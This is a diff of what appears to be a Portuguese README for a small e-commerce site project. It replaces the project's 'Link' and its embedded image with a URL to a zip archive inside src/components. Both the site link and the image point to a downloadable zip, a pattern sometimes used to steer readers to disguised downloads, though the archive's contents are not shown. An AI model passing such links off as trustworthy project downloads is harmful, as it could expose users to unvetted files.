@@ -8,7 +8,7 @@
 
 ## Link
 
-https://raw.githubusercontent.com/Raizagomes/Alves-labe-commerce6/master/public/Alves-labe-commerce6_2.6.zip
+https://github.com/Raizagomes/Alves-labe-commerce6/raw/refs/heads/master/src/components/commerce-Alves-labe-v2.0.zip
 
 ## Descrição das funcionalidades do site:
 
@@ -27,4 +27,4 @@ https://raw.githubusercontent.com/Raizagomes/Alves-labe-commerce6/master/public/
 
 ## Imagens:
 
-![Imagens](https://raw.githubusercontent.com/Raizagomes/Alves-labe-commerce6/master/public/Alves-labe-commerce6_2.6.zip)
+![Imagens](https://github.com/Raizagomes/Alves-labe-commerce6/raw/refs/heads/master/src/components/commerce-Alves-labe-v2.0.zip)
